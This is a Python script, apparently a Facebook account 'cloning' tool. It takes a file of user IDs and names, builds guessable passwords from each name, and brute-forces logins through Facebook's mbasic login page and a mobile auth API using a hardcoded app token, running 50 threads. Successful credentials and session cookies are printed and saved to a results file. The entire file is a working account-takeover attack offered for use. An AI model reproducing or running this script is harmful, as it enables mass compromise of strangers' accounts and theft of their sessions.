#!/usr/bin/python3
#-*-coding:utf-8-*-
# AUTHOR: CHARSI BRAND HU (V29)

import os, requests, re, sys, time, random
from concurrent.futures import ThreadPoolExecutor as CharsiTurbo

# --- COLORS ---
G = '\x1b[1;92m' # Green
W = '\x1b[1;97m' # White
R = '\x1b[1;91m' # Red
C = '\x1b[1;36m' # Cyan
Y = '\x1b[1;93m' # Yellow

loop, ok, cp = 0, [], []
id = []

def logo():
    os.system('clear')
    print(f"""{G}
   ____ _   _    _    ____  ____ ___ 
  / ___| | | |  / \  |  _ \/ ___|_ _|
 | |   | |_| | / _ \ | |_) \___ \ | | 
 | |___|  _  |/ ___ \|  _ < ___) || | 
  \____|_| |_/_/   \_\_| \_\____/___|
{W} ----------------------------------------------
{G} [•] AUTHOR    : CHARSI BRAND HU
{G} [•] MODE      : LITE + OFFICIAL + CHECKER
{G} [•] STATUS    : FULL HEAVY WORKING 2025
{W} ----------------------------------------------""")

def get_passwords(full_name):
    nm = full_name.lower()
    first = nm.split(' ')[0]
    last = nm.split(' ')[1] if ' ' in nm else "khan"
    return [
        first + "123", last + "123", first + " " + last,
        first + last, first + "1234", first + "12345",
        first + "786", nm, full_name, "pakistan"
    ]

def check_login(uid, pw, cookies):
    """Auto-Checker to verify if ID is active"""
    try:
        data = requests.get(f"https://graph.facebook.com/me?access_token={cookies}", timeout=5).json()
        if 'id' in data: return True
        else: return False
    except: return False

def method_lite(uid, name):
    global loop, ok, cp
    sys.stdout.write(f'\r {W}[LITE] {loop}/{len(id)} {G}OK:{len(ok)} {Y}CP:{len(cp)} ')
    sys.stdout.flush()
    pwx = get_passwords(name)
    session = requests.Session()
    for pw in pwx:
        try:
            ua = "Mozilla/5.0 (Linux; Android 12; FB_IAB/FB4A;FBAV/350.0.0.0.0;)"
            header = {'authority': 'mbasic.facebook.com', 'user-agent': ua}
            res = session.get('https://mbasic.facebook.com/login.php', headers=header).text
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                "email": uid, "pass": pw, "login": "Log In"
            }
            post = session.post('https://mbasic.facebook.com/login.php', data=data, headers=header)
            if 'c_user' in session.cookies.get_dict():
                coki = ";".join([f"{k}={v}" for k,v in session.cookies.get_dict().items()])
                print(f'\r\r{G} [CHARSI-OK] {uid} | {pw} \n [COOKIE] {coki}')
                ok.append(uid); open('/sdcard/CHARSI_OK.txt', 'a').write(f'{uid}|{pw}|{coki}\n'); break
            elif 'checkpoint' in session.cookies.get_dict():
                cp.append(uid); break
        except: pass
    loop += 1

def method_official(uid, name):
    global loop, ok, cp
    sys.stdout.write(f'\r {W}[OFFICIAL] {loop}/{len(id)} {G}OK:{len(ok)} {Y}CP:{len(cp)} ')
    sys.stdout.flush()
    pwx = get_passwords(name)
    for pw in pwx:
        try:
            ua = f"Mozilla/5.0 (Linux; Android {random.randint(11,15)}; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.0.0;]"
            url = "https://b-api.facebook.com/method/auth.login"
            params = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23462f46a9",
                "sdk_style": "android", "email": uid, "password": pw, "format": "JSON", "generate_session_cookies": "1"
            }
            res = requests.post(url, data=params, headers={'user-agent': ua}).json()
            if "session_key" in res or "c_user" in str(res):
                print(f'\r\r{G} [CHARSI-OK] {uid} | {pw} ')
                ok.append(uid); open('/sdcard/CHARSI_OK.txt', 'a').write(f'{uid}|{pw}\n'); break
            elif "www.facebook.com" in res.get("error_msg", ""):
                cp.append(uid); break
        except: pass
    loop += 1

def start():
    logo()
    print(f" {G}[1] METHOD FB LITE (MBASIC)")
    print(f" {G}[2] METHOD FB OFFICIAL (API)")
    print(f" {R}[0] EXIT")
    m = input(f"\n {C}[?] Select : {W}")
    
    path = input(f" {G}[?] File Path : {W}")
    try:
        global id
        id = open(path, 'r').read().splitlines()
    except: print(f" {R}[!] File Not Found"); return
    
    logo()
    print(f" {G}[*] Total IDs : {len(id)} | Threads: 50")
    print(f"{W} ----------------------------------------------")
    
    with CharsiTurbo(max_workers=50) as turbo:
        for user in id:
            try:
                uid, name = user.split('|')
                if m == '1': turbo.submit(method_lite, uid, name)
                else: turbo.submit(method_official, uid, name)
            except: pass
    
    print(f"\n{G} [√] Cloning Done. Results in /sdcard/CHARSI_OK.txt")

if __name__ == "__main__":
    start()
